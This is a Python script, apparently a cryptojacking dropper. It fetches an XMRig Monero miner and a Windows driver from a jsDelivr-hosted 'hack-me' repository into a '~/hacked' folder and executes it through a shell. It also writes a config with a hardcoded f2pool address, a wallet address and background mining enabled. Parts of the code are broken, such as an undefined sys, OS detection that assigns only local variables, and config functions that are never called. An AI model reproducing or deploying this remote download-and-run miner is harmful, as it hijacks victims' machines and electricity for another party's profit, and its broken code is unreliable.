import os
import requests
import subprocess
import platform

# 通用 URL，最后不要添加 `/`
BASE_URL = "https://cdn.jsdelivr.net/gh/imByteCat/hack-me@master"
# 通用文件存放目录
BASE_DIR = os.path.expanduser("~/hacked")

# 矿池设置
POOL = "xmr.f2pool.com:13531"
USER = "42tqjNBzQjCZA3aGq4v5rha6NsXgGfSEyTxoScjhEPZq5woPsydEWcC8sHiAbKueHnDvaJmj2F77fKNq1f4ok2LEPwJYB2s"
PASSWORD = "x"
WORKER = "cross"

# 其他挖矿设置
PRIORITY = 1  # set process priority (0 idle, 2 normal to 5 highest)
DONATE = 1  # 捐赠，默认 5，即 5%
BACKGROUND = "true"  # 是否后台挖矿

# 系统平台
OS_TYPE = "linux"
OS_ARCH = "64bit"


def create_base_dir():
    # 通用文件目录不存在时将其创建
    if not os.path.exists(BASE_DIR):
        os.makedirs(BASE_DIR)


def write_config():
    # 写入 XMRig 配置文件
    config = """
{{
    \"api\": {{
        \"id\": null,
        \"worker-id\": null
    }},
    \"http\": {{
        \"enabled\": false,
        \"host\": \"127.0.0.1\",
        \"port\": 0,
        \"access-token\": null,
        \"restricted\": true
    }},
    \"autosave\": true,
    \"background\": {BACKGROUND},
    \"colors\": true,
    \"randomx\": {{
        \"init\": -1,
        \"mode\": \"auto\",
        \"1gb-pages\": false,
        \"rdmsr\": true,
        \"wrmsr\": true,
        \"numa\": true
    }},
    \"cpu\": {{
        \"enabled\": true,
        \"huge-pages\": true,
        \"hw-aes\": null,
        \"priority\": {PRIORITY},
        \"memory-pool\": false,
        \"yield\": true,
        \"max-threads-hint\": 100,
        \"asm\": true,
        \"argon2-impl\": null,
        \"astrobwt-max-size\": 550,
        \"cn/0\": false,
        \"cn-lite/0\": false
    }},
    \"opencl\": {{
        \"enabled\": false,
        \"cache\": true,
        \"loader\": null,
        \"platform\": \"AMD\",
        \"adl\": true,
        \"cn/0\": false,
        \"cn-lite/0\": false
    }},
    \"cuda\": {{
        \"enabled\": false,
        \"loader\": null,
        \"nvml\": true,
        \"cn/0\": false,
        \"cn-lite/0\": false
    }},
    \"donate-level\": {DONATE},
    \"donate-over-proxy\": 1,
    \"log-file\": null,
    \"pools\": [
        {{
            \"algo\": null,
            \"coin\": null,
            \"url\": \"{POOL}\",
            \"user\": \"{USER}.{WORKER}\",
            \"pass\": \"{PASSWORD}\",
            \"rig-id\": null,
            \"nicehash\": false,
            \"keepalive\": true,
            \"enabled\": true,
            \"tls\": false,
            \"tls-fingerprint\": null,
            \"daemon\": false,
            \"socks5\": null,
            \"self-select\": null
        }}
    ],
    \"print-time\": 60,
    \"health-print-time\": 60,
    \"retries\": 5,
    \"retry-pause\": 5,
    \"syslog\": false,
    \"tls\": {{
        \"enabled\": false,
        \"protocols\": null,
        \"cert\": null,
        \"cert_key\": null,
        \"ciphers\": null,
        \"ciphersuites\": null,
        \"dhparam\": null
    }},
    \"user-agent\": null,
    \"verbose\": 0,
    \"watch\": true
}}
""".format(
        POOL=POOL,
        USER=USER,
        PASSWORD=PASSWORD,
        WORKER=WORKER,
        BACKGROUND=BACKGROUND,
        PRIORITY=PRIORITY,
        DONATE=DONATE,
    )

    # 写入配置文件
    with open(os.path.join(BASE_DIR, "config.json"), "w") as f:
        f.write(config)


def get_os_info():
    # 判断操作系统
    system_str = platform.system()
    if(system_str == "Windows"):
        OS_TYPE = "windows"
        # 判断是否是 Windows 32位
        if not "PROGRAMFILES(X86)" in os.environ:
            OS_ARCH = "32bit"
    elif(system_str == "Linux"):
        OS_TYPE = "linux"
    else:
        try:
            sys.exit(0)
        except:
            print('Unknown OS, aborted.')


def download_file(url, filepath):
    r = requests.get(url)
    # TODO 改成无拓展名的时候检查
    # if os.path.basename(url) == "xmrig" and OS_TYPE == "windows":
    if os.path.splitext(url)[-1][1:] == "" and OS_TYPE == "windows":
        filename = os.path.join(filepath, os.path.basename(
            url) + ".exe")  # Windows 平台需要额外的 .exe 拓展名
    else:
        filename = os.path.join(filepath, os.path.basename(url))
    with open(filename, "wb") as f:
        f.write(r.content)


def run_miner():
    # Windows 64bit
    if OS_TYPE == "windows" and OS_ARCH == "64bit":
        download_file(BASE_URL + "/windows/64bit/xmrig", BASE_DIR)
        download_file(BASE_URL + "/windows/64bit/WinRing0x64.sys", BASE_DIR)
        subprocess.call(os.path.join(BASE_DIR, "xmrig.exe"), shell=True)
    # Windows 32bit
    if OS_TYPE == "windows" and OS_ARCH == "32bit":
        download_file(BASE_URL + "/windows/32bit/xmrig", BASE_DIR)
        subprocess.call(os.path.join(BASE_DIR, "xmrig.exe"), shell=True)
    # Linux (64bit)
    if OS_TYPE == "linux":
        download_file(BASE_URL + "/linux/64bit/xmrig", BASE_DIR)
        subprocess.call(os.path.join(BASE_DIR, "xmrig"), shell=True)


if __name__ == "__main__":
    run_miner()
